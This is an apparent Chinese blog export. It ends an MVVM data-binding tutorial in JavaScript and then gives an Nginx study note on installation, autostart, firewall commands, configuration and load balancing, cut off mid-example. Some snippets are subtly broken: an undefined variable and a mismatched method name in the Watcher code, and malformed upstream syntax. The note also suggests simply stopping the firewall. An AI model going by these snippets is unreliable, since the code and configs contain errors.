这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法，代码改善之后是这样 1234567891011121314151617181920212223242526272829// ... 省略function defineReactive(data, key, val) &#123; var dep = new Dep(); observe(val); // 监听子属性 Object.defineProperty(data, key, &#123; // ... 省略 set: function(newVal) &#123; if (val === newVal) return; console.log('哈哈哈，监听到值变化了 ', val, ' --&gt; ', newVal); val = newVal; dep.notify(); // 通知所有订阅者 &#125; &#125;);&#125;function Dep() &#123; this.subs = [];&#125;Dep.prototype = &#123; addSub: function(sub) &#123; this.subs.push(sub); &#125;, notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); &#125;); &#125;&#125;; 那么问题来了，谁是订阅者，怎么往订阅器添加订阅者？ 没错，上面的思路整理中我们已经明确订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就必须要在闭包内操作，所以我们可以在getter里面动手脚： 12345678910111213141516171819// Observer.js// ...省略Object.defineProperty(data, key, &#123; get: function() &#123; // 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除 Dep.target &amp;&amp; dep.addDep(Dep.target); return val; &#125; // ... 省略&#125;);// Watcher.jsWatcher.prototype = &#123; get: function(key) &#123; Dep.target = this; this.value = data[key]; // 这里会触发属性的getter，从而添加订阅者 Dep.target = null; &#125;&#125; 这里已经实现了一个Observer了，已经具备了监听数据和数据变化通知订阅者的功能。那么接下来就是实现Compile了 2.2 实现Compile compile主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图 并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示 因为遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作 解析完成，再将fragment添加回原来的真实dom节点中 12345678910111213141516171819function Compile(el) &#123; this.$el = this.isElementNode(el) ? el : document.querySelector(el); if (this.$el) &#123; this.$fragment = this.node2Fragment(this.$el); this.init(); this.$el.appendChild(this.$fragment); &#125;&#125;Compile.prototype = &#123; init: function() &#123; this.compileElement(this.$fragment); &#125;, node2Fragment: function(el) &#123; var fragment = document.createDocumentFragment(), child; // 将原生节点拷贝到fragment while (child = el.firstChild) &#123; fragment.appendChild(child); &#125; return fragment; &#125;&#125;; compileElement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Compile.prototype = &#123; // ... 省略 compileElement: function(el) &#123; var childNodes = el.childNodes, me = this; [].slice.call(childNodes).forEach(function(node) &#123; var text = node.textContent; var reg = /\\&#123;\\&#123;(.*)\\&#125;\\&#125;/; // 表达式文本 // 按元素节点方式编译 if (me.isElementNode(node)) &#123; me.compile(node); &#125; else if (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123; me.compileText(node, RegExp.$1); &#125; // 遍历编译子节点 if (node.childNodes &amp;&amp; node.childNodes.length) &#123; me.compileElement(node); &#125; &#125;); &#125;, compile: function(node) &#123; var nodeAttrs = node.attributes, me = this; [].slice.call(nodeAttrs).forEach(function(attr) &#123; // 规定：指令以 v-xxx 命名 // 如 &lt;span v-text=\"content\"&gt;&lt;/span&gt; 中指令为 v-text var attrName = attr.name; // v-text if (me.isDirective(attrName)) &#123; var exp = attr.value; // content var dir = attrName.substring(2); // text if (me.isEventDirective(dir)) &#123; // 事件指令, 如 v-on:click compileUtil.eventHandler(node, me.$vm, exp, dir); &#125; else &#123; // 普通指令 compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp); &#125; &#125; &#125;); &#125;&#125;;// 指令处理集合var compileUtil = &#123; text: function(node, vm, exp) &#123; this.bind(node, vm, exp, 'text'); &#125;, // ...省略 bind: function(node, vm, exp, dir) &#123; var updaterFn = updater[dir + 'Updater']; // 第一次初始化视图 updaterFn &amp;&amp; updaterFn(node, vm[exp]); // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher new Watcher(vm, exp, function(value, oldValue) &#123; // 一旦属性值有变化，会收到通知执行此更新函数，更新视图 updaterFn &amp;&amp; updaterFn(node, value, oldValue); &#125;); &#125;&#125;;// 更新函数var updater = &#123; textUpdater: function(node, value) &#123; node.textContent = typeof value == 'undefined' ? '' : value; &#125; // ...省略&#125;; 完整代码 https://github.com/poetries/mvvm/blob/master/compile.js 这里通过递归遍历保证了每个节点及子节点都会解析编译到 指令的声明规定是通过特定前缀的节点属性来标记，如&lt;span v-text=&quot;content&quot;中v-text便是指令 监听数据、绑定更新函数的处理是在compileUtil.bind()这个方法中，通过new Watcher()添加回调来接收数据变化的通知 至此，一个简单的Compile就完成了。接下来要看看Watcher这个订阅者的具体实现了 2.3 实现Watcher Watcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是 在自身实例化时往属性订阅器dep里面添加自己 自身必须有一个update()方法 待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。 123456789101112131415161718192021222324252627282930313233343536373839404142function Watcher(vm, exp, cb) &#123; this.cb = cb; this.vm = vm; this.exp = exp; // 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解 this.value = this.get(); &#125;Watcher.prototype = &#123; update: function() &#123; this.run(); // 属性值变化收到通知 &#125;, run: function() &#123; var value = this.get(); // 取到最新值 var oldVal = this.value; if (value !== oldVal) &#123; this.value = value; this.cb.call(this.vm, value, oldVal); // 执行Compile中绑定的回调，更新视图 &#125; &#125;, get: function() &#123; Dep.target = this; // 将当前订阅者指向自己 var value = this.vm[exp]; // 触发getter，添加自己到属性订阅器中 Dep.target = null; // 添加完毕，重置 return value; &#125;&#125;;// 这里再次列出Observer和Dep，方便理解Object.defineProperty(data, key, &#123; get: function() &#123; // 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除 Dep.target &amp;&amp; dep.addDep(Dep.target); return val; &#125; // ... 省略&#125;);Dep.prototype = &#123; notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); // 调用订阅者的update方法，通知变化 &#125;); &#125;&#125;; 完整代码 https://github.com/poetries/mvvm/blob/master/watcher.js 实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherInstance就能收到更新通知。 基本上vue中数据绑定相关比较核心的几个模块也是这几个，猛戳这里 , 在src 目录可找到vue源码。 最后来讲讲MVVM入口文件的相关逻辑和实现吧，相对就比较简单了 三、实现MVVM MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。 一个简单的MVVM构造器是这样子： 123456function MVVM(options) &#123; this.$options = options; var data = this._data = this.$options.data; observe(data, this); this.$compile = new Compile(options.el || document.body, this)&#125; 但是这里有个问题，从代码中可看出监听的数据对象是options.data，每次需要更新视图，则必须通过var vm = new MVVM({data:{name: &#39;kindeng&#39;}}); vm._data.name = &#39;dmq&#39;;这样的方式来改变数据。 显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的：var vm = new MVVM({data: {name: &#39;kindeng&#39;}}); vm.name = &#39;dmq&#39;; 所以这里需要给MVVM实例添加一个属性代理的方法，使访问vm的属性代理为访问vm._data的属性，改造后的代码如下： 1234567891011121314151617181920212223242526function MVVM(options) &#123; this.$options = options; var data = this._data = this.$options.data, me = this; // 属性代理，实现 vm.xxx -&gt; vm._data.xxx Object.keys(data).forEach(function(key) &#123; me._proxy(key); &#125;); observe(data, this); this.$compile = new Compile(options.el || document.body, this)&#125;MVVM.prototype = &#123; _proxy: function(key) &#123; var me = this; Object.defineProperty(me, key, &#123; configurable: false, enumerable: true, get: function proxyGetter() &#123; return me._data[key]; &#125;, set: function proxySetter(newVal) &#123; me._data[key] = newVal; &#125; &#125;); &#125;&#125; 完整代码 https://github.com/poetries/mvvm/blob/master/mvvm.js 这里主要还是利用了Object.defineProperty()这个方法来劫持了vm实例对象的属性的读写权，使读写vm实例的属性转成读写了vm._data的属性值，达到鱼目混珠的效果","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"MVVM","slug":"MVVM","permalink":"https://ru23.com/tags/MVVM/"}]},{"title":"Nginx学习篇","slug":"2018-02-nginx-study","date":"2018-02-25T07:12:08.000Z","updated":"2018-10-24T03:46:02.356Z","comments":true,"path":"note/34cba3a2.html","link":"","permalink":"https://ru23.com/note/34cba3a2.html","excerpt":"","text":"Nginx 是一款面向性能设计的 HTTP 服务器，能反向代理 HTTP，HTTPS 和邮件相关(SMTP，POP3，IMAP)的协议链接。并且提供了负载均衡以及 HTTP 缓存。它的设计充分使用异步事件模型，削减上下文调度的开销，提高服务器并发能力。采用了模块化设计，提供了丰富模块的第三方模块。 所以关于 `Nginx，有这些标签：「异步」「事件」「模块化」「高性能」「高并发」「反向代理」「负载均衡」 一、安装1.1 安装依赖 prce(重定向支持)和openssl(https支持，如果不需要https可以不安装) 123yum install -y pcre-devel yum -y install gcc make gcc-c++ wgetyum -y install openssl openssl-devel CentOS 6.5 我安装的时候是选择的“基本服务器”，默认这两个包都没安装全，所以这两个都运行安装即可 1.2 下载nginx的所有版本在这里 123456789wget http://nginx.org/download/nginx-1.13.3.tar.gzwget http://nginx.org/download/nginx-1.13.7.tar.gz# 如果没有安装wget# 下载已编译版本$ yum install wget# 解压压缩包tar zxf nginx-1.13.3.tar.gz 1.3 编译安装然后进入目录编译安装，configure参数说明 1234567891011121314151617181920212223cd nginx-1.11.5./configure....Configuration summary + using system PCRE library + OpenSSL library is not used + using system zlib library nginx path prefix: \"/usr/local/nginx\" nginx binary file: \"/usr/local/nginx/sbin/nginx\" nginx modules path: \"/usr/local/nginx/modules\" nginx configuration prefix: \"/usr/local/nginx/conf\" nginx configuration file: \"/usr/local/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/nginx/logs/nginx.pid\" nginx error log file: \"/usr/local/nginx/logs/error.log\" nginx http access log file: \"/usr/local/nginx/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" 安装报错误的话比如：“C compiler cc is not found”，这个就是缺少编译环境，安装一下就可以了 yum -y install gcc make gcc-c++ openssl-devel 如果没有error信息，就可以执行下边的安装了： 12makemake install 1.4 nginx测试 运行下面命令会出现两个结果，一般情况nginx会安装在/usr/local/nginx目录中 12345cd /usr/local/nginx/sbin/./nginx -t# nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 1.5 设置全局nginx命令1vi ~/.bash_profile 将下面内容添加到 ~/.bash_profile 文件中 12PATH=$PATH:$HOME/bin:/usr/local/nginx/sbin/export PATH 运行命令 source ~/.bash_profile 让配置立即生效。你就可以全局运行 nginx 命令了。 二、开机自启动开机自启动方法一 编辑 vi /lib/systemd/system/nginx.service 文件，没有创建一个 touch nginx.service - 然后将如下内容根据具体情况进行修改后，添加到nginx.service文件中： 12345678910111213141516[Unit]Description=nginxAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/var/run/nginx.pidExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.confExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 1234567891011[Unit]:服务的说明 Description:描述服务 After:描述服务类别 [Service]服务运行参数的设置 Type=forking是后台运行的形式 ExecStart为服务的具体运行命令 ExecReload为重启命令 ExecStop为停止命令 PrivateTmp=True表示给服务分配独立的临时空间 注意：[Service]的启动、重启、停止命令全部要求使用绝对路径 [Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3 保存退出。 设置开机启动，使配置生效： 123systemctl enable nginx.service# 输出下面内容表示成功了Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service. 开机自启动方法二 1234vi /etc/rc.local# 在 rc.local 文件中，添加下面这条命令/usr/local/nginx/sbin/nginx start 如果开机后发现自启动脚本没有执行，你要去确认一下rc.local这个文件的访问权限是否是可执行的，因为rc.local默认是不可执行的。修改rc.local访问权限，增加可执行权限： 1chmod +x /etc/rc.d/rc.local 三、运维3.1 服务管理1234567891011121314# 启动/usr/local/nginx/sbin/nginx# 重启/usr/local/nginx/sbin/nginx -s reload# 关闭进程/usr/local/nginx/sbin/nginx -s stop# 平滑关闭nginx/usr/local/nginx/sbin/nginx -s quit# 查看nginx的安装状态，/usr/local/nginx/sbin/nginx -V 关闭防火墙，或者添加防火墙规则就可以测试了 1service iptables stop 或者编辑配置文件： 1vi /etc/sysconfig/iptables 添加这样一条开放80端口的规则后保存： 1-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT 重启服务即可: 123service iptables restart# 命令进行查看目前natiptables -t nat -L 3.2 重启服务防火墙报错解决123service iptables restart# Redirecting to /bin/systemctl restart iptables.service# Failed to restart iptables.service: Unit iptables.service failed to load: No such file or directory. 在CentOS 7或RHEL 7或Fedora中防火墙由 firewalld 来管理，当然你可以还原传统的管理方式。或则使用新的命令进行管理。假如采用传统请执行一下命令 123# 传统命令systemctl stop firewalldsystemctl mask firewalld 12345# 安装命令yum install iptables-servicessystemctl enable iptables service iptables restart 四、nginx卸载 如果通过yum安装，使用下面命令安装。 1yum remove nginx 编译安装，删除/usr/local/nginx目录即可 如果配置了自启动脚本，也需要删除。 五、参数说明 参数 说明 –prefix=&lt;path&gt; Nginx安装路径。如果没有指定，默认为 /usr/local/nginx。 –sbin-path=&lt;path&gt; Nginx可执行文件安装路径。只能安装时指定，如果没有指定，默认为&lt;prefix&gt;/sbin/nginx。 –conf-path=&lt;path&gt; 在没有给定-c选项下默认的nginx.conf的路径。如果没有指定，默认为&lt;prefix&gt;/conf/nginx.conf。 –pid-path=&lt;path&gt; 在nginx.conf中没有指定pid指令的情况下，默认的nginx.pid的路径。如果没有指定，默认为 &lt;prefix&gt;/logs/nginx.pid。 –lock-path=&lt;path&gt; nginx.lock文件的路径。 –error-log-path=&lt;path&gt; 在nginx.conf中没有指定error_log指令的情况下，默认的错误日志的路径。如果没有指定，默认为 &lt;prefix&gt;/- logs/error.log。 –http-log-path=&lt;path&gt; 在nginx.conf中没有指定access_log指令的情况下，默认的访问日志的路径。如果没有指定，默认为 &lt;prefix&gt;/- logs/access.log。 –user=&lt;user&gt; 在nginx.conf中没有指定user指令的情况下，默认的nginx使用的用户。如果没有指定，默认为 nobody。 –group=&lt;group&gt; 在nginx.conf中没有指定user指令的情况下，默认的nginx使用的组。如果没有指定，默认为 nobody。 –builddir=DIR 指定编译的目录 –with-rtsig_module 启用 rtsig 模块 –with-select_module –without-select_module 允许或不允许开启SELECT模式，如果 configure 没有找到更合适的模式，比如：kqueue(sun os),epoll (linux kenel 2.6+), rtsig(- 实时信号)或者/dev/poll(一种类似select的模式，底层实现与SELECT基本相 同，都是采用轮训方法) SELECT模式将是默认安装模式 –with-poll_module –without-poll_module Whether or not to enable the poll module. This module is enabled by, default if a more suitable method such as kqueue, epoll, rtsig or /dev/poll is not discovered by configure. –with-http_ssl_module Enable ngx_http_ssl_module. Enables SSL support and the ability to handle HTTPS requests. Requires OpenSSL. On Debian, this is libssl-dev. 开启HTTP SSL模块，使NGINX可以支持HTTPS请求。这个模块需要已经安装了OPENSSL，在DEBIAN上是libssl –with-http_realip_module 启用 ngx_http_realip_module –with-http_addition_module 启用 ngx_http_addition_module –with-http_sub_module 启用 ngx_http_sub_module –with-http_dav_module 启用 ngx_http_dav_module –with-http_flv_module 启用 ngx_http_flv_module –with-http_stub_status_module 启用 “server status” 页 –without-http_charset_module 禁用 ngx_http_charset_module –without-http_gzip_module 禁用 ngx_http_gzip_module. 如果启用，需要 zlib 。 –without-http_ssi_module 禁用 ngx_http_ssi_module –without-http_userid_module 禁用 ngx_http_userid_module –without-http_access_module 禁用 ngx_http_access_module –without-http_auth_basic_module 禁用 ngx_http_auth_basic_module –without-http_autoindex_module 禁用 ngx_http_autoindex_module –without-http_geo_module 禁用 ngx_http_geo_module –without-http_map_module 禁用 ngx_http_map_module –without-http_referer_module 禁用 ngx_http_referer_module –without-http_rewrite_module 禁用 ngx_http_rewrite_module. 如果启用需要 PCRE 。 –without-http_proxy_module 禁用 ngx_http_proxy_module –without-http_fastcgi_module 禁用 ngx_http_fastcgi_module –without-http_memcached_module 禁用 ngx_http_memcached_module –without-http_limit_zone_module 禁用 ngx_http_limit_zone_module –without-http_empty_gif_module 禁用 ngx_http_empty_gif_module –without-http_browser_module 禁用 ngx_http_browser_module –without-http_upstream_ip_hash_module 禁用 ngx_http_upstream_ip_hash_module –with-http_perl_module 启用 ngx_http_perl_module –with-perl_modules_path=PATH 指定 perl 模块的路径 –with-perl=PATH 指定 perl 执行文件的路径 –http-log-path=PATH Set path to the http access log –http-client-body-temp-path=PATH Set path to the http client request body temporary files –http-proxy-temp-path=PATH Set path to the http proxy temporary files –http-fastcgi-temp-path=PATH Set path to the http fastcgi temporary files –without-http 禁用 HTTP server –with-mail 启用 IMAP4/POP3/SMTP 代理模块 –with-mail_ssl_module 启用 ngx_mail_ssl_module –with-cc=PATH 指定 C 编译器的路径 –with-cpp=PATH 指定 C 预处理器的路径 –with-cc-opt=OPTIONS Additional parameters which will be added to the variable CFLAGS. With the use of the system library PCRE in FreeBSD, it is necessary to indicate –with-cc-opt=”-I /usr/local/include”. If we are using select() and it is necessary to increase the number of file descriptors, then this also can be assigned here: –with-cc-opt=”-D FD_SETSIZE=2048”. –with-ld-opt=OPTIONS Additional parameters passed to the linker. With the use of the system library PCRE in - FreeBSD, it is necessary to indicate –with-ld-opt=”-L /usr/local/lib”. –with-cpu-opt=CPU 为特定的 CPU 编译，有效的值包括：pentium, pentiumpro, pentium3, pentium4, athlon, opteron, amd64, sparc32, sparc64, ppc64 –without-pcre 禁止 PCRE 库的使用。同时也会禁止 HTTP rewrite 模块。在 “location” 配置指令中的正则表达式也需要 PCRE 。 –with-pcre=DIR 指定 PCRE 库的源代码的路径。 –with-pcre-opt=OPTIONS Set additional options for PCRE building. –with-md5=DIR Set path to md5 library sources. –with-md5-opt=OPTIONS Set additional options for md5 building. –with-md5-asm Use md5 assembler sources. –with-sha1=DIR Set path to sha1 library sources. –with-sha1-opt=OPTIONS Set additional options for sha1 building. –with-sha1-asm Use sha1 assembler sources. –with-zlib=DIR Set path to zlib library sources. –with-zlib-opt=OPTIONS Set additional options for zlib building. –with-zlib-asm=CPU Use zlib assembler sources optimized for specified CPU, valid values are: pentium, pentiumpro –with-openssl=DIR Set path to OpenSSL library sources –with-openssl-opt=OPTIONS Set additional options for OpenSSL building –with-debug 启用调试日志 –add-module=PATH Add in a third-party module found in directory PATH 六、配置 在Centos 默认配置文件在 /usr/local/nginx-1.5.1/conf/nginx.conf 我们要在这里配置一些文件。nginx.conf是主配置文件，由若干个部分组成，每个大括号{}表示一个部分。每一行指令都由分号结束;，标志着一行的结束。 6.1 常用正则 正则 说明 正则 说明 . 匹配除换行符以外的任意字符 $ 匹配字符串的结束 ? 重复0次或1次 {n} 重复n次 + 重复1次或更多次 {n,} 重复n次或更多次 * 重复0次或更多次 [c] 匹配单个字符c \\d 匹配数字 [a-z] 匹配a-z小写字母的任意一个 ^ 匹配字符串的开始 - - 6.2 全局变量 变量 说明 变量 说明 $args 这个变量等于请求行中的参数，同$query_string $remote_port 客户端的端口。 $content_length 请求头中的Content-length字段。 $remote_user 已经经过Auth Basic Module验证的用户名。 $content_type 请求头中的Content-Type字段。 $request_filename 当前请求的文件路径，由root或alias指令与URI请求生成。 $document_root 当前请求在root指令中指定的值。 $scheme HTTP方法（如http，https）。 $host 请求主机头字段，否则为服务器名称。 $server_protocol 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。 $http_user_agent 客户端agent信息 $server_addr 服务器地址，在完成一次系统调用后可以确定这个值。 $http_cookie 客户端cookie信息 $server_name 服务器名称。 $limit_rate 这个变量可以限制连接速率。 $server_port 请求到达服务器的端口号。 $request_method 客户端请求的动作，通常为GET或POST。 $request_uri 包含请求参数的原始URI，不包含主机名，如：/foo/bar.php?arg=baz。 $remote_addr 客户端的IP地址。 $uri 不带请求参数的当前URI，$uri不包含主机名，如/foo/bar.html。 $document_uri 与$uri相同。 - - 例如请求：http://localhost:3000/test1/test2/test.php 123456$host：localhost $server_port：3000 $request_uri：/test1/test2/test.php $document_uri：/test1/test2/test.php $document_root：/var/www/html $request_filename：/var/www/html/test1/test2/test.php 6.3 符号参考 符号 说明 符号 说明 符号 说明 k,K 千字节 m,M 兆字节 ms 毫秒 s 秒 m 分钟 h 小时 d 日 w 周 M 一个月, 30天 例如，”8k”，”1m” 代表字节数计量。 例如，”1h 30m”，”1y 6M”。代表 “1小时 30分”，”1年零6个月”。 6.4 配置文件 nginx 的配置系统由一个主配置文件和其他一些辅助的配置文件构成。这些配置文件均是纯文本文件，全部位于 nginx 安装目录下的 conf 目录下。 指令由 nginx 的各个模块提供，不同的模块会提供不同的指令来实现配置。指令除了 Key-Value 的形式，还有作用域指令。 nginx.conf 中的配置信息，根据其逻辑上的意义，对它们进行了分类，也就是分成了多个作用域，或者称之为配置指令上下文。不同的作用域含有一个或者多个配置项。 下面的这些上下文指令是用的比较多： Directive Description Contains Directive main nginx 在运行时与具体业务功能（比如 http 服务或者 email服务代理）无关的一些参数，比如工作进程数，运行的身份等。 user, worker_processes, error_log, events, http, mail http 与提供 http 服务相关的一些配置参数。例如：是否使用 keepalive啊，是否使用gzip 进行压缩等。 server server http 服务上支持若干虚拟主机。每个虚拟主机一个对应的 server 配置项，配置项里面包含该虚拟主机相关的配置。在提供 mail 服务的代理时，也可以建立若干 server. 每个 server 通过监听的地址来区分。 listen, server_name,access_log, location, protocol, proxy, smtp_auth, xclient location http 服务中，某些特定的 URL 对应的一系列配置项。 index, root mail 实现email相关的 SMTP/IMAP/POP3 代理时，共享的一些配置项（因为可能实现多个代理，工作在多个监听地址上）。 server,http, imap_capabilities include 以便增强配置文件的可读性，使得部分配置文件可以重新使用。 - valid_referers 用来校验Http请求头Referer是否有效。 - try_files 用在server部分，不过最常见的还是用在location部分，它会按照给定的参数顺序进行尝试，第一个被匹配到的将会被使用。 - if 当在location块中使用if指令，在某些情况下它并不按照预期运行，一般来说避免使用if指令。 - 例如我们再 nginx.conf 里面引用两个配置 vhost/example.com.conf和 vhost/gitlab.com.conf 它们都被放在一个我自己新建的目录 vhost下面。nginx.conf 配置如下： 12345678910111213141516171819202122232425262728293031323334353637worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; include vhost/example.com.conf; include vhost/gitlab.com.conf;&#125; 简单的配置: example.com.conf 1234567server &#123; #侦听的80端口 listen 80; server_name baidu.com app.baidu.com; # 这里指定域名 index index.html index.htm; # 这里指定默认入口页面 root /home/www/app.baidu.com; # 这里指定目录&#125; 6.5 内置预定义变量 Nginx提供了许多预定义的变量，也可以通过使用set来设置变量。你可以在if中使用预定义变量，也可以将它们传递给代理服务器。以下是一些常见的预定义变量，更多详见 变量名称 值 $args_name 在请求中的name参数 $args ` 所有请求参数 $query_string $args的别名 $content_length 请求头Content-Length的值 $content_type 请求头Content-Type的值 $host 如果当前有Host，则为请求头Host的值；如果没有这个头，那么该值等于匹配该请求的server_name的值 $remote_addr 客户端的IP地址 $request 完整的请求，从客户端收到，包括Http请求方法、URI、Http协议、头、请求体 $request_uri 完整请求的URI，从客户端来的请求，包括参数 $scheme 当前请求的协议 $uri 当前请求的标准化URI 6.6 反向代理 反向代理是一个Web服务器，它接受客户端的连接请求，然后将请求转发给上游服务器，并将从服务器得到的结果返回给连接的客户端。下面简单的反向代理的例子： 123456789101112server &#123; listen 80; server_name localhost; client_max_body_size 1024M; # 允许客户端请求的最大单文件字节数 location / &#123; proxy_pass http://localhost:8080; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-For $remote_addr; # HTTP的请求端真实的IP proxy_set_header X-Forwarded-Proto $scheme; # 为了正确地识别实际用户发出的协议是 http 还是 https &#125;&#125; 复杂的配置: gitlab.com.conf。 1234567891011121314151617181920server &#123; #侦听的80端口 listen 80; server_name git.example.cn; location / &#123; proxy_pass http://localhost:3000; #以下是一些反向代理的配置可删除 proxy_redirect off; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 proxy_connect_timeout 300; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 300; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 300; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） &#125;&#125; 代理到上游服务器的配置中，最重要的是proxy_pass指令。以下是代理模块中的一些常用指令： 指令 说明 proxy_connect_timeout Nginx从接受请求至连接到上游服务器的最长等待时间 proxy_send_timeout 后端服务器数据回传时间(代理发送超时) proxy_read_timeout 连接成功后，后端服务器响应时间(代理接收超时) proxy_cookie_domain 替代从上游服务器来的Set-Cookie头的domain属性 proxy_cookie_path 替代从上游服务器来的Set-Cookie头的path属性 proxy_buffer_size 设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers proxy_buffers缓冲区，网页平均在多少k以下 proxy_set_header 重写发送到上游服务器头的内容，也可以通过将某个头部的值设置为空字符串，而不发送某个头部的方法实现 proxy_ignore_headers 这个指令禁止处理来自代理服务器的应答。 proxy_intercept_errors 使nginx阻止HTTP应答代码为400或者更高的应答。 6.7 负载均衡 upstream指令启用一个新的配置区段，在该区段定义一组上游服务器。这些服务器可能被设置不同的权重，也可能出于对服务器进行维护，标记为down。 123456789101112131415161718192021222324252627282930313233upstream gitlab &#123; ip_hash; # upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 server 192.168.122.11:8081 ; server 127.0.0.1:82 weight=3; server 127.0.0.1:83 weight=3 down; server 127.0.0.1:84 weight=3; max_fails=3 fail_timeout=20s; server 127.0.0.1:85 weight=4;; keepalive 32;&#125;server &#123; #侦听的80端口 listen 80; server_name git.example.cn; location / &#123; proxy_pass http://gitlab; #在这里设置一个代理，和upstream的名字一样 #以下是一些反向代理的配置可删除 proxy_redirect off; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 proxy_connect_timeout 300; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 300; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 300; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k;# 缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 &#125;&#125; 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 负载均衡： upstream模块能够使用3种负载均衡算法：轮询、IP哈希、最少连接数。 轮询： 默认情况下使用轮询算法，不需要配置指令来激活它，它是基于在队列中谁是下一个的原理确保访问均匀地分布到每个上游服务器； IP哈希： 通过ip_hash指令来激活，Nginx通过IPv4地址的前3个字节或者整个IPv6地址作为哈希键来实现，同一个IP地址总是能被映射到同一个上游服务器； 最少连接数： 通过least_conn指令来激活，该算法通过选择一个活跃数最少的上游服务器进行连接。如果上游服务器处理能力不同，可以通过给server配置weight权重来说明，该算法将考虑到不同服务器的加权最少连接数。 6.7.1 RR简单配置 这里我配置了2台服务器，当然实际上是一台，只是端口不一样而已，而8081的服务器是不存在的，也就是说访问不到，但是我们访问 http://localhost 的时候，也不会有问题，会默认跳转到http://localhost:8080具体是因为Nginx会自动判断服务器的状态，如果服务器处于不能访问（服务器挂了），就不会跳转到这台服务器，所以也避免了一台服务器挂了影响使用的情况，由于Nginx默认是RR策略，所以我们不需要其他更多的设置 1234567891011121314upstream test &#123; server 